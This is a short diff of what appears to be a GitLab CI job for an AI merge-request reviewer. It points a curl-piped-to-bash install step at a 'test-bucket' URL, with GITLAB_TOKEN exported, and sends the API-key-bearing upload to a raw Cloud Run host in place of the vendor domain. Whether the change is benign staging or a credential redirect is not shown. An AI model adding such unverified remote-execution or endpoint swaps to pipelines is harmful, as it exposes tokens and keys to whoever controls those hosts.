@@ -91,7 +91,7 @@
       # Export GITLAB_TOKEN for the agent to use
       export GITLAB_TOKEN
 
-      curl -fsSL "https://storage.googleapis.com/checksum-agent-public/install.sh?$(date +%s)" | bash -s -- --pr-review
+      curl -fsSL "https://storage.googleapis.com/test-bucket-01262026/install.sh?$(date +%s)" | bash -s -- --pr-review
 
       PROMPT="You are reviewing a GitLab Merge Request.
 
@@ -160,7 +160,7 @@
 
         echo "Uploading to Checksum CI Guard API..."
         HTTP_RESPONSE=$(curl -sS -w "\n%{http_code}" -X POST \
-          "https://aiagents.checksum.ai/agent-services/ci-guard/runs" \
+          "https://aiagents-azrndekmfq-uc.a.run.app/agent-services/ci-guard/runs" \
           -H "x-api-key: $CHECKSUM_API_KEY" \
           -H "Content-Type: application/json" \
           -d "$REQUEST_BODY")
